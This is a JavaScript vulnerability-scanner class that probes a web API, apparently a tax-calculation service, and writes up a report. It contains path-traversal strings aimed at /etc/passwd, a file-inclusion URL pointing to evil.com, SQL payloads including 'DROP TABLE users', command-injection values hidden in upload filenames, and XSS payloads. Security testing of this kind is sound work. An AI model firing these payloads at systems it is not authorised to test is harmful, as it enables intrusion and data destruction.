const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');

class VulnerabilityScanner {
  constructor(baseUrl, authToken) {
    this.baseUrl = baseUrl;
    this.authToken = authToken;
    this.vulnerabilities = [];
    this.testResults = {
      total: 0,
      passed: 0,
      failed: 0,
      critical: 0,
      high: 0,
      medium: 0,
      low: 0
    };
  }

  async runComprehensiveScan() {
    console.log('🔍 Starting comprehensive vulnerability scan...');

    await this.scanInformationDisclosure();
    await this.scanInjectionVulnerabilities();
    await this.scanAccessControlIssues();
    await this.scanCryptographicWeaknesses();
    await this.scanConfigurationIssues();
    await this.scanBusinessLogicFlaws();

    return this.generateReport();
  }

  async scanInformationDisclosure() {
    console.log('🔍 Scanning for information disclosure vulnerabilities...');

    // Test for sensitive data exposure
    await this.testSensitiveDataExposure();
    await this.testErrorMessageDisclosure();
    await this.testDirectoryTraversal();
    await this.testFileInclusionVulnerabilities();
  }

  async testSensitiveDataExposure() {
    const tests = [
      {
        name: 'Check for exposed configuration files',
        urls: [
          '/config.json',
          '/.env',
          '/package.json',
          '/docker-compose.yml',
          '/.git/config',
          '/web.config',
          '/app.config'
        ],
        severity: 'high'
      },
      {
        name: 'Check for debug endpoints',
        urls: [
          '/debug',
          '/dev',
          '/test',
          '/admin',
          '/status/debug',
          '/api/debug'
        ],
        severity: 'medium'
      },
      {
        name: 'Check for backup files',
        urls: [
          '/backup.sql',
          '/database.sql',
          '/users.sql',
          '/app.sql.bak',
          '/backup.zip'
        ],
        severity: 'critical'
      }
    ];

    for (const test of tests) {
      for (const url of test.urls) {
        try {
          const response = await axios.get(`${this.baseUrl}${url}`, { timeout: 5000 });

          if (response.status === 200) {
            this.addVulnerability({
              type: 'Information Disclosure',
              description: `Exposed file: ${url}`,
              severity: test.severity,
              url: url,
              evidence: `HTTP ${response.status} - Content-Length: ${response.headers['content-length']}`
            });
          }
        } catch (error) {
          // 404 is expected and good
          if (error.response?.status !== 404) {
            console.log(`Unexpected response for ${url}: ${error.response?.status}`);
          }
        }
      }
    }
  }

  async testErrorMessageDisclosure() {
    const errorTests = [
      {
        request: () => axios.get(`${this.baseUrl}/api/users/999999999`),
        description: 'Database error in user lookup'
      },
      {
        request: () => axios.post(`${this.baseUrl}/api/calculations`, { malformed: 'data' }),
        description: 'Validation error disclosure'
      },
      {
        request: () => axios.get(`${this.baseUrl}/api/files/../../../etc/passwd`),
        description: 'Path traversal error'
      }
    ];

    for (const test of errorTests) {
      try {
        await test.request();
      } catch (error) {
        const errorMessage = JSON.stringify(error.response?.data || {});

        // Check for sensitive information in error messages
        const sensitivePatterns = [
          /\/var\/www/,
          /\/home\/\w+/,
          /C:\\\\[Uu]sers/,
          /node_modules/,
          /\.js:\d+:\d+/,
          /at \w+\s*\(/,
          /Error: .* at/,
          /MongoError|SQLError|OracleError/,
          /password|secret|key/i
        ];

        for (const pattern of sensitivePatterns) {
          if (pattern.test(errorMessage)) {
            this.addVulnerability({
              type: 'Information Disclosure',
              description: `Error message disclosure: ${test.description}`,
              severity: 'medium',
              evidence: errorMessage.substring(0, 500)
            });
            break;
          }
        }
      }
    }
  }

  async testDirectoryTraversal() {
    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ];

    for (const payload of traversalPayloads) {
      try {
        const response = await axios.get(`${this.baseUrl}/api/files/${payload}`, { headers });

        if (response.status === 200 && response.data.includes('root:')) {
          this.addVulnerability({
            type: 'Directory Traversal',
            description: 'Successful directory traversal attack',
            severity: 'critical',
            evidence: `Payload: ${payload}, Response contains system file content`
          });
        }
      } catch (error) {
        // Expected to fail
      }
    }
  }

  async testFileInclusionVulnerabilities() {
    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};
    const inclusionPayloads = [
      'http://evil.com/malicious.txt',
      'file:///etc/passwd',
      'php://filter/read=convert.base64-encode/resource=index.php',
      'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
    ];

    for (const payload of inclusionPayloads) {
      try {
        await axios.post(`${this.baseUrl}/api/templates/render`, {
          template: payload
        }, { headers });

        this.addVulnerability({
          type: 'File Inclusion',
          description: 'Potential file inclusion vulnerability',
          severity: 'high',
          evidence: `Payload: ${payload}`
        });
      } catch (error) {
        // Expected to fail
      }
    }
  }

  async scanInjectionVulnerabilities() {
    console.log('🔍 Scanning for injection vulnerabilities...');

    await this.testSQLInjection();
    await this.testNoSQLInjection();
    await this.testCommandInjection();
    await this.testXSSVulnerabilities();
  }

  async testSQLInjection() {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT username, password FROM users --",
      "admin'--",
      "' OR 1=1 --",
      "') OR ('1'='1",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    ];

    const testEndpoints = [
      { endpoint: '/api/auth/login', field: 'email' },
      { endpoint: '/api/users/search', field: 'query' },
      { endpoint: '/api/calculations/search', field: 'filter' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of sqlPayloads) {
        try {
          const data = { [endpoint.field]: payload };
          if (endpoint.endpoint.includes('login')) {
            data.password = 'test';
          }

          const response = await axios.post(`${this.baseUrl}${endpoint.endpoint}`, data);

          // Check response for signs of SQL injection success
          if (response.status === 200 && endpoint.endpoint.includes('login')) {
            this.addVulnerability({
              type: 'SQL Injection',
              description: 'Potential SQL injection in login',
              severity: 'critical',
              evidence: `Payload: ${payload}, Successful login response`
            });
          }
        } catch (error) {
          // Check error message for SQL errors
          const errorMessage = JSON.stringify(error.response?.data || {});
          if (/sql|mysql|postgres|oracle|database|syntax/i.test(errorMessage)) {
            this.addVulnerability({
              type: 'SQL Injection',
              description: 'SQL error message disclosure',
              severity: 'high',
              evidence: errorMessage.substring(0, 300)
            });
          }
        }
      }
    }
  }

  async testNoSQLInjection() {
    const noSqlPayloads = [
      { "$ne": null },
      { "$where": "function() { return true; }" },
      { "$regex": ".*" },
      { "$gt": "" },
      { "$or": [{"username": "admin"}, {"username": "root"}] }
    ];

    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};

    for (const payload of noSqlPayloads) {
      try {
        await axios.post(`${this.baseUrl}/api/auth/login`, {
          email: payload,
          password: "test"
        });

        this.addVulnerability({
          type: 'NoSQL Injection',
          description: 'Potential NoSQL injection vulnerability',
          severity: 'high',
          evidence: `Payload: ${JSON.stringify(payload)}`
        });
      } catch (error) {
        // Expected to fail
      }

      // Test in search parameters
      try {
        await axios.get(`${this.baseUrl}/api/calculations`, {
          headers,
          params: { filter: JSON.stringify(payload) }
        });
      } catch (error) {
        // Check for NoSQL error messages
        const errorMessage = JSON.stringify(error.response?.data || {});
        if (/mongo|nosql|bson/i.test(errorMessage)) {
          this.addVulnerability({
            type: 'NoSQL Injection',
            description: 'NoSQL error message disclosure',
            severity: 'medium',
            evidence: errorMessage.substring(0, 300)
          });
        }
      }
    }
  }

  async testCommandInjection() {
    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '`id`',
      '$(uname -a)',
      '\n/bin/cat /etc/passwd'
    ];

    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};

    for (const payload of commandPayloads) {
      try {
        // Test in filename parameter
        const FormData = require('form-data');
        const formData = new FormData();
        formData.append('file', 'test content', { filename: `test${payload}.txt` });
        formData.append('documentType', 'tax_data');

        await axios.post(`${this.baseUrl}/api/files/upload`, formData, {
          headers: { ...headers, ...formData.getHeaders() }
        });

        this.addVulnerability({
          type: 'Command Injection',
          description: 'Potential command injection in file upload',
          severity: 'critical',
          evidence: `Payload: ${payload}`
        });
      } catch (error) {
        // Expected to fail
      }

      // Test in other parameters
      try {
        await axios.post(`${this.baseUrl}/api/reports/generate`, {
          format: 'pdf',
          template: `standard${payload}`
        }, { headers });

        this.addVulnerability({
          type: 'Command Injection',
          description: 'Potential command injection in report generation',
          severity: 'critical',
          evidence: `Payload: ${payload}`
        });
      } catch (error) {
        // Expected to fail
      }
    }
  }

  async testXSSVulnerabilities() {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<svg onload="alert(\'XSS\')">',
      '\'-alert("XSS")-\'',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ];

    const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};

    for (const payload of xssPayloads) {
      try {
        // Test in calculation description
        const response = await axios.post(`${this.baseUrl}/api/calculations`, {
          ...global.TEST_DATA?.taxCalculation || {
            income: 50000,
            country: 'US',
            filingStatus: 'single',
            year: 2023
          },
          description: payload
        }, { headers });

        if (response.status === 201) {
          // Retrieve and check if XSS payload is reflected unescaped
          const calcId = response.data.calculationId;
          const retrieveResponse = await axios.get(
            `${this.baseUrl}/api/calculations/${calcId}`,
            { headers }
          );

          const responseText = JSON.stringify(retrieveResponse.data);
          if (responseText.includes('<script>') || responseText.includes('onerror=')) {
            this.addVulnerability({
              type: 'Cross-Site Scripting (XSS)',
              description: 'Stored XSS in calculation description',
              severity: 'high',
              evidence: `Payload: ${payload}, Reflected unescaped in response`
            });
          }
        }
      } catch (error) {
        // Expected to fail for some payloads
      }
    }
  }

  async scanAccessControlIssues() {
    console.log('🔍 Scanning for access control vulnerabilities...');

    await this.testBrokenAccessControl();
    await this.testPrivilegeEscalation();
    await this.testInsecureDirectObjectReferences();
  }

  async testBrokenAccessControl() {
    // Test access without authentication
    const protectedEndpoints = [
      '/api/calculations',
      '/api/reports',
      '/api/files',
      '/api/user/profile',
      '/api/admin/users'
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        const response = await axios.get(`${this.baseUrl}${endpoint}`);

        if (response.status === 200) {
          this.addVulnerability({
            type: 'Broken Access Control',
            description: `Unprotected endpoint: ${endpoint}`,
            severity: 'high',
            evidence: `HTTP 200 response without authentication`
          });
        }
      } catch (error) {
        // 401/403 expected for protected endpoints
        if (error.response?.status === 200) {
          this.addVulnerability({
            type: 'Broken Access Control',
            description: `Accessible without authentication: ${endpoint}`,
            severity: 'high',
            evidence: `HTTP 200 response`
          });
        }
      }
    }
  }

  async testPrivilegeEscalation() {
    if (!this.authToken) return;

    const headers = { 'Authorization': `Bearer ${this.authToken}` };
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/system',
      '/api/admin/config',
      '/api/admin/logs'
    ];

    for (const endpoint of adminEndpoints) {
      try {
        const response = await axios.get(`${this.baseUrl}${endpoint}`, { headers });

        if (response.status === 200) {
          this.addVulnerability({
            type: 'Privilege Escalation',
            description: `Regular user can access admin endpoint: ${endpoint}`,
            severity: 'critical',
            evidence: `HTTP 200 response with user token`
          });
        }
      } catch (error) {
        // 403 expected for admin endpoints
      }
    }
  }

  async testInsecureDirectObjectReferences() {
    if (!this.authToken) return;

    const headers = { 'Authorization': `Bearer ${this.authToken}` };

    // Try to access other users' resources
    const resourceIds = ['1', '999', '0', '-1', 'admin', 'root'];

    for (const id of resourceIds) {
      try {
        const response = await axios.get(`${this.baseUrl}/api/user/profile/${id}`, { headers });

        if (response.status === 200) {
          this.addVulnerability({
            type: 'Insecure Direct Object Reference',
            description: `Can access other user's profile: ${id}`,
            severity: 'high',
            evidence: `HTTP 200 response for user ID ${id}`
          });
        }
      } catch (error) {
        // 403/404 expected
      }
    }
  }

  async scanCryptographicWeaknesses() {
    console.log('🔍 Scanning for cryptographic vulnerabilities...');

    await this.testSSLConfiguration();
    await this.testPasswordStorage();
    await this.testSessionManagement();
  }

  async testSSLConfiguration() {
    // Test SSL/TLS configuration
    try {
      const response = await axios.get(this.baseUrl.replace('https:', 'http:'));

      if (response.status === 200) {
        this.addVulnerability({
          type: 'Weak Cryptography',
          description: 'Service accepts HTTP connections',
          severity: 'medium',
          evidence: 'HTTP connection successful'
        });
      }
    } catch (error) {
      // Good - HTTP should be rejected or redirected
    }
  }

  async testPasswordStorage() {
    // Check for password in responses
    try {
      const headers = this.authToken ? { 'Authorization': `Bearer ${this.authToken}` } : {};
      const response = await axios.get(`${this.baseUrl}/api/auth/me`, { headers });

      const responseText = JSON.stringify(response.data);
      if (/password|hash|salt/i.test(responseText)) {
        this.addVulnerability({
          type: 'Sensitive Data Exposure',
          description: 'User endpoint exposes password-related data',
          severity: 'high',
          evidence: 'Response contains password/hash/salt fields'
        });
      }
    } catch (error) {
      // Expected if not authenticated
    }
  }

  async testSessionManagement() {
    // Test for session fixation
    const session1 = await this.loginAndGetToken();
    const session2 = await this.loginAndGetToken();

    if (session1 && session2 && session1 === session2) {
      this.addVulnerability({
        type: 'Session Management',
        description: 'Possible session fixation vulnerability',
        severity: 'medium',
        evidence: 'Same token returned for multiple logins'
      });
    }
  }

  async loginAndGetToken() {
    try {
      const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
        email: 'test@example.com',
        password: 'TestPassword123!'
      });
      return response.data.token;
    } catch (error) {
      return null;
    }
  }

  async scanConfigurationIssues() {
    console.log('🔍 Scanning for security configuration issues...');

    await this.testSecurityHeaders();
    await this.testErrorHandling();
    await this.testServerInformation();
  }

  async testSecurityHeaders() {
    try {
      const response = await axios.get(`${this.baseUrl}/health`);
      const headers = response.headers;

      const requiredHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': ['DENY', 'SAMEORIGIN'],
        'x-xss-protection': '1; mode=block'
      };

      for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
        if (!headers[header]) {
          this.addVulnerability({
            type: 'Security Misconfiguration',
            description: `Missing security header: ${header}`,
            severity: 'medium',
            evidence: 'Header not present in response'
          });
        } else if (Array.isArray(expectedValue)) {
          if (!expectedValue.includes(headers[header])) {
            this.addVulnerability({
              type: 'Security Misconfiguration',
              description: `Weak security header value: ${header}`,
              severity: 'low',
              evidence: `Value: ${headers[header]}`
            });
          }
        }
      }

      // Check for information disclosure headers
      if (headers['server']) {
        this.addVulnerability({
          type: 'Information Disclosure',
          description: 'Server header exposes software information',
          severity: 'low',
          evidence: `Server: ${headers['server']}`
        });
      }

      if (headers['x-powered-by']) {
        this.addVulnerability({
          type: 'Information Disclosure',
          description: 'X-Powered-By header exposes technology stack',
          severity: 'low',
          evidence: `X-Powered-By: ${headers['x-powered-by']}`
        });
      }
    } catch (error) {
      console.error('Error testing security headers:', error.message);
    }
  }

  async testErrorHandling() {
    const errorUrls = [
      '/nonexistent',
      '/api/invalid',
      '/api/calculations/invalid-id'
    ];

    for (const url of errorUrls) {
      try {
        await axios.get(`${this.baseUrl}${url}`);
      } catch (error) {
        const errorData = error.response?.data;
        const errorText = JSON.stringify(errorData);

        // Check for information disclosure in error messages
        if (/stack|trace|line \d+|\.js:\d+/i.test(errorText)) {
          this.addVulnerability({
            type: 'Information Disclosure',
            description: `Error message contains stack trace: ${url}`,
            severity: 'medium',
            evidence: errorText.substring(0, 200)
          });
        }
      }
    }
  }

  async testServerInformation() {
    // Check for common information disclosure endpoints
    const infoEndpoints = [
      '/server-info',
      '/phpinfo',
      '/info',
      '/server-status',
      '/stats'
    ];

    for (const endpoint of infoEndpoints) {
      try {
        const response = await axios.get(`${this.baseUrl}${endpoint}`);

        if (response.status === 200) {
          this.addVulnerability({
            type: 'Information Disclosure',
            description: `Information disclosure endpoint: ${endpoint}`,
            severity: 'medium',
            evidence: 'Endpoint accessible and returns server information'
          });
        }
      } catch (error) {
        // 404 expected
      }
    }
  }

  async scanBusinessLogicFlaws() {
    console.log('🔍 Scanning for business logic vulnerabilities...');

    await this.testWorkflowBypass();
    await this.testDataValidation();
    await this.testRateLimit();
  }

  async testWorkflowBypass() {
    if (!this.authToken) return;

    const headers = { 'Authorization': `Bearer ${this.authToken}` };

    // Try to generate report without calculation
    try {
      await axios.post(`${this.baseUrl}/api/reports/generate`, {
        calculationId: 'nonexistent',
        format: 'pdf'
      }, { headers });

      this.addVulnerability({
        type: 'Business Logic Flaw',
        description: 'Can generate report without valid calculation',
        severity: 'medium',
        evidence: 'Report generation succeeded with invalid calculation ID'
      });
    } catch (error) {
      // Expected to fail
    }
  }

  async testDataValidation() {
    if (!this.authToken) return;

    const headers = { 'Authorization': `Bearer ${this.authToken}` };

    // Test negative income
    try {
      await axios.post(`${this.baseUrl}/api/calculations`, {
        income: -50000,
        country: 'US',
        filingStatus: 'single',
        year: 2023
      }, { headers });

      this.addVulnerability({
        type: 'Business Logic Flaw',
        description: 'Accepts negative income values',
        severity: 'medium',
        evidence: 'Calculation succeeded with negative income'
      });
    } catch (error) {
      // Expected to fail
    }

    // Test impossible dates
    try {
      await axios.post(`${this.baseUrl}/api/calculations`, {
        income: 50000,
        country: 'US',
        filingStatus: 'single',
        year: 1800
      }, { headers });

      this.addVulnerability({
        type: 'Business Logic Flaw',
        description: 'Accepts invalid tax year',
        severity: 'low',
        evidence: 'Calculation succeeded with year 1800'
      });
    } catch (error) {
      // Expected to fail
    }
  }

  async testRateLimit() {
    if (!this.authToken) return;

    const headers = { 'Authorization': `Bearer ${this.authToken}` };

    // Test rate limiting
    const requests = Array(20).fill().map(() =>
      axios.get(`${this.baseUrl}/api/calculations`, { headers })
    );

    const results = await Promise.allSettled(requests);
    const rateLimitedRequests = results.filter(
      r => r.status === 'rejected' && r.reason?.response?.status === 429
    );

    if (rateLimitedRequests.length === 0) {
      this.addVulnerability({
        type: 'Business Logic Flaw',
        description: 'No rate limiting detected',
        severity: 'medium',
        evidence: 'All rapid requests succeeded without rate limiting'
      });
    }
  }

  addVulnerability(vuln) {
    this.vulnerabilities.push({
      ...vuln,
      timestamp: new Date().toISOString(),
      id: `vuln_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    });

    this.testResults.total++;
    this.testResults[vuln.severity]++;

    console.log(`❌ ${vuln.severity.toUpperCase()}: ${vuln.description}`);
  }

  generateReport() {
    const report = {
      scanDate: new Date().toISOString(),
      target: this.baseUrl,
      summary: this.testResults,
      vulnerabilities: this.vulnerabilities,
      recommendations: this.generateRecommendations()
    };

    return report;
  }

  generateRecommendations() {
    const recommendations = [];

    if (this.vulnerabilities.some(v => v.type.includes('Injection'))) {
      recommendations.push({
        category: 'Input Validation',
        priority: 'high',
        action: 'Implement comprehensive input validation and parameterized queries'
      });
    }

    if (this.vulnerabilities.some(v => v.type.includes('Access Control'))) {
      recommendations.push({
        category: 'Authorization',
        priority: 'critical',
        action: 'Review and strengthen access control mechanisms'
      });
    }

    if (this.vulnerabilities.some(v => v.type.includes('Information Disclosure'))) {
      recommendations.push({
        category: 'Information Security',
        priority: 'medium',
        action: 'Remove or protect sensitive information disclosure points'
      });
    }

    if (this.vulnerabilities.some(v => v.type.includes('Security Misconfiguration'))) {
      recommendations.push({
        category: 'Configuration',
        priority: 'medium',
        action: 'Implement proper security headers and configuration'
      });
    }

    return recommendations;
  }

  async saveReport(filename) {
    const report = this.generateReport();
    const reportPath = path.join(__dirname, '../reports', filename);

    await fs.mkdir(path.dirname(reportPath), { recursive: true });
    await fs.writeFile(reportPath, JSON.stringify(report, null, 2));

    console.log(`📊 Vulnerability scan report saved to: ${reportPath}`);
    return reportPath;
  }
}

module.exports = VulnerabilityScanner;